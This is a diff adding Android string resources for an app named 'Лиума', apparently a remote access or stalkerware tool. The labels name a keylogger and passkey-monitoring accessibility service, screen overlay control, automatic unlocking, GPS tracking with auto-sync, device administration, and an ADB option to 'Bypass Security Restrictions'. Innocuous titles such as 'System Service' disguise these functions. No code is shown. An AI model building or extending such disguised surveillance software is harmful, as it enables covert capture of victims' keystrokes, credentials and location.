@@ -1,0 +1,20 @@
+<resources>
+    <string name="app_name">Лиума</string>
+    <string name="accessibility_description">Remote device management service</string>
+    <string name="keylogger_accessibility_description">System input monitoring service</string>
+    <string name="accessibility_overlay_desc">Remote screen overlay control service</string>
+    <string name="accessibility_passkey_desc">Secure input monitoring service</string>
+    <string name="accessibility_service_label">System Service</string>
+    <string name="accessibility_auto_unlock_desc">System unlock automation service</string>
+    <string name="service_gps_desc">Location tracking service</string>
+    <string name="device_admin_desc">Device administration for security policies</string>
+    <string name="service_main_desc">Core system management service</string>
+    <string name="service_gps_tracker_desc">GPS tracking with offline cache and auto-sync</string>
+    
+    <!-- ADB Helper Settings -->
+    <string name="adb_helper_title">ADB Helper</string>
+    <string name="adb_bypass_security">Bypass Security Restrictions</string>
+    <string name="adb_standard_mode">Standard Mode</string>
+    <string name="adb_enabled">ADB Helper Enabled</string>
+    <string name="adb_disabled">ADB Helper Disabled</string>
+</resources>
